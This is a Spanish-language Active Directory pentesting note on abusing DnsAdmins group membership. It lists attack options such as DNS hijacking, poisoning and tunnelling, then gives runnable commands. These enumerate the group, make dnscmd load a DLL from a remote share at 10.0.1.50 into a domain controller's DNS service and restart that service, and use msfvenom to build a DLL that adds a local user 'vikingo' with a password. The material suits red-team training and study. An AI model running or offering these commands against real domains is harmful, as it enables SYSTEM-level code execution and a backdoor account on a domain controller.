# DNS Admins 

Tags: #AD #DNSAdmins

```bash 
1. Modificación de Registros DNS: El atacante podría cambiar los registros DNS para redirigir el tráfico de red legítimo a sistemas bajo su control. Esto se podría utilizar para realizar ataques de hombre en el medio, capturar credenciales, distribuir malware, o para desacreditar la infraestructura de red de una organización.
2. Acceso a la Zona de Transferencia: Podría obtener acceso a la transferencia de zona DNS y, por tanto, tener una lista completa de todos los registros DNS en el dominio, lo que podría ser utilizado para mapear la red interna de una organización y planear ataques futuros.
3. Configurar Redirecciones DNS: Establecer redirecciones maliciosas, conocidas como DNS hijacking, para capturar datos de usuarios que creen estar accediendo a sitios legítimos.
4. DNS Túnel: Establecer un canal encubierto para exfiltrar datos de la red de manera discreta utilizando protocolo DNS.
5. DNS Poisoning: Podría envenenar la caché DNS para responder a solicitudes legítimas con respuestas falsas, enviando a los usuarios a direcciones IP controladas por él.
6. Ejecución de Código Remoto: Un vector de ataque particularmente peligroso es la posibilidad de ejecutar código arbitrario en el contexto del servicio DNS. Esto se debe a que, en algunas versiones de Windows, los miembros del grupo `DnsAdmins` pueden cargar DLLs arbitrarias en el proceso del servicio DNS. Esto podría permitir al atacante ejecutar código arbitrario con privilegios de sistema, posiblemente permitiéndole escalar privilegios en el servidor DNS o en otros sistemas.
7. Establecimiento de Persistencia: Una vez que tiene control sobre el DNS, el atacante podría establecer mecanismos de persistencia en la red, dificultando su detección y eliminación.
8. Detección de Servicios de Seguridad: El control sobre el DNS también puede ser utilizado para mapear servicios de seguridad como IDS, IPS y firewalls, planificando cómo evadirlos.
9. Disrupción del Servicio: Puede causar una negación de servicio al desconfigurar el DNS o apagarlo por completo.
10. Manipulación de Trusts: En entornos con trusts de AD configurados, la manipulación de DNS puede ser utilizada para subvertir esos trusts y posiblemente extender el compromiso a otros dominios.
```

## Utilizando PowerView.ps1

```powershell 
❯ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

## Utilizando NET

```powershell
❯ net user dnsadmin.user /domain
```

## Cargando una dll maliciosa con dnscmd

```powershell
# Impersonando al usuario dnsadmin.user
❯ runas /netonly /user:spartancybersec.corp\dnsadmin.user "powershell.exe"

❯ hostname
❯ dnscmd First-DC /config /serverlevelplugindll \\10.0.1.50\shared\adduser2.dll
```

```powershell
❯ sc.exe \\First-DC stop dns 
❯ sc.exe \\First-DC start dns
❯ net user vikingo
```

```powershell
❯ Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters
```

## Generando una DLL maliciosa

* [DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL/tree/master)
* [DNS-exe-persistance](https://github.com/dim0x69/dns-exe-persistance)

```powershell
❯ msfvenom -p windows/x64/exec cmd='net user vikingo P4ssw0rd /add' -f dll -o adduser2.dll
```